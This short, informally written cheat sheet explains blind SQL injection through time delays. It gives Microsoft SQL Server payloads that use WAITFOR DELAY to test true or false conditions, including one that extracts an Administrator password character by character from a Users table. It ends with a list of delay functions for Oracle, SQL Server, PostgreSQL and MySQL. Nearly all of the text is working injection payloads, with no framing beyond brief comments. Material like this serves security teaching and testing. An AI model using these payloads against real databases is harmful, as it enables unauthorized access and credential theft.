it is often possible to exploit blind sql injection vulnerabillity by triggering time delays depending on whether an injected condition is tru or false

in microsoft server you can use this:

'; IF (1=2) WAITFOR DELAY '0:0:10'--  //will not trigger a delay because the condition is false
'; IF (1=1) WAITFOR DELAY '0:0:10'--  //evaluates to true so there will be a ten seconds delay

now we can retrieve the data we want one character at a time..

'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--










Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

Oracle 
	dbms_pipe.receive_message(('a'),10)
Microsoft 
	WAITFOR DELAY '0:0:10'
PostgreSQL 
	SELECT pg_sleep(10)
MySQL 	
SELECT SLEEP(10)
